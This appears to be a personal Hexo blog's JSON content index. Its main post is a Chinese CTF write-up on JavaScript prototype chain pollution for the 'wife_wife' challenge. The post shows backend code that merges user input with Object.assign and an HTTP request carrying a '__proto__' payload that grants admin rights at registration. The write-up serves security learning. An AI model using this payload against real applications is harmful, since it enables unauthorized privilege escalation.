{"meta":{"title":"isum","subtitle":"","description":"","author":"isum","url":"https://ehzisum.github.io","root":"/"},"pages":[{"title":"关于页","date":"2024-04-26T23:27:22.000Z","updated":"2024-05-29T14:00:20.545Z","comments":true,"path":"about/index.html","permalink":"https://ehzisum.github.io/about/index.html","excerpt":"","text":"还没有"}],"posts":[{"title":"褥一把ctf系列之js原型链污染","slug":"褥一把ctf系列之js原型链污染 475639cfebe4417d9b26ea06a02c3d75","date":"2024-05-29T14:08:46.562Z","updated":"2024-05-29T15:46:50.413Z","comments":true,"path":"2024/05/29/褥一把ctf系列之js原型链污染 475639cfebe4417d9b26ea06a02c3d75/","link":"","permalink":"https://ehzisum.github.io/2024/05/29/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bjs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%20475639cfebe4417d9b26ea06a02c3d75/","excerpt":"","text":"CATCTF——wife_wife(攻防世界) 总结 页面巨可爱! 需要以admin登录进去 知识点：一.———————- 1.node.js创建新用户的常见方法 2.关于js的对象：可以说 “JavaScript 对象是变量的容器”，但是，我们通常认为 “JavaScript 对象是键值对的容器” json.parse() 将json数据解析为js对象 (关于数据传输：body部分被 Express.js 的中间件body-parser解析为json数据) 3.object.assign()： Object.assign() - JavaScript | MDN (mozilla.org) 4.js原型链污染 继承与原型链 - JavaScript | MDN (mozilla.org) 浅析CTF中的Node.js原型链污染 - FreeBuf网络安全行业门户 //随便注册一个看看数据包 POST /register HTTP/1.1 Host: 61.147.171.105:49801 Content-Length: 47 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://61.147.171.105:49801 Referer: http://61.147.171.105:49801/register.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close &#123;&quot;username&quot;:&quot;b&quot;,&quot;password&quot;:&quot;b&quot;,&quot;isAdmin&quot;:false&#125; //前端代码 &lt;script&gt; function register(username, password, inviteCode, isAdmin)&#123; let user = &#123;username, password, isAdmin&#125; if(isAdmin)&#123; if(!inviteCode)&#123; alert(&#39;invite code required&#39;) return &#125; user = &#123;...user, inviteCode&#125; &#125; fetch(&#39;/register&#39;, &#123; method: &#39;post&#39;, body: JSON.stringify(user) &#125;) .then(res =&gt; res.json()) .then(res =&gt; &#123; alert(res.msg) if(!res.err)&#123; location.href = &#39;/login&#39; &#125; &#125;) &#125; function handle_isAdmin_change(isAdmin)&#123; document.getElementById(&#39;div-invitecode&#39;).hidden = !isAdmin &#125; &lt;/script&gt; //wp里部分后端源码 app.post(&#39;/register&#39;, (req, res) =&gt; &#123; let user = JSON.parse(req.body) if (!user.username || !user.password) &#123; return res.json(&#123; msg: &#39;empty username or password&#39;, err: true &#125;) &#125; if (users.filter(u =&gt; u.username == user.username).length) &#123; return res.json(&#123; msg: &#39;username already exists&#39;, err: true &#125;) &#125; if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) &#123; user.isAdmin = false return res.json(&#123; msg: &#39;invalid invite code&#39;, err: true &#125;) &#125; let newUser = Object.assign(&#123;&#125;, baseUser, user) //就是这里，原型链污染 users.push(newUser) res.json(&#123; msg: &#39;user created successfully&#39;, err: false &#125;) &#125;) //发包，注册成功 POST /register HTTP/1.1 Host: 61.147.171.105:49801 Content-Length: 62 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://61.147.171.105:49801 Referer: http://61.147.171.105:49801/register.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close &#123;&quot;username&quot;:&quot;e&quot;,&quot;password&quot;:&quot;e&quot;,&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;","categories":[{"name":"刷题o比赛","slug":"刷题o比赛","permalink":"https://ehzisum.github.io/categories/%E5%88%B7%E9%A2%98o%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"原型链污染","slug":"原型链污染","permalink":"https://ehzisum.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}]},{"title":"Hello World","slug":"hello-world","date":"2024-04-26T03:03:01.684Z","updated":"2024-05-29T14:35:28.177Z","comments":true,"path":"2024/04/26/hello-world/","link":"","permalink":"https://ehzisum.github.io/2024/04/26/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post&#x2F;page$ hexo new &quot;PostName&quot; $ hexo new page &quot;PageName&quot; More info: Writing Run server$ hexo server --port==8000 #开启访问（默认端口4000，`ctrl + c` 关闭），查看帮助（hexo server -help） More info: Server Generate static files$ hexo generate #生成静态页面至public目录 More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment","categories":[{"name":"洪秀全","slug":"洪秀全","permalink":"https://ehzisum.github.io/categories/%E6%B4%AA%E7%A7%80%E5%85%A8/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://ehzisum.github.io/tags/hexo/"}]}],"categories":[{"name":"刷题o比赛","slug":"刷题o比赛","permalink":"https://ehzisum.github.io/categories/%E5%88%B7%E9%A2%98o%E6%AF%94%E8%B5%9B/"},{"name":"洪秀全","slug":"洪秀全","permalink":"https://ehzisum.github.io/categories/%E6%B4%AA%E7%A7%80%E5%85%A8/"}],"tags":[{"name":"原型链污染","slug":"原型链污染","permalink":"https://ehzisum.github.io/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"hexo","slug":"hexo","permalink":"https://ehzisum.github.io/tags/hexo/"}]}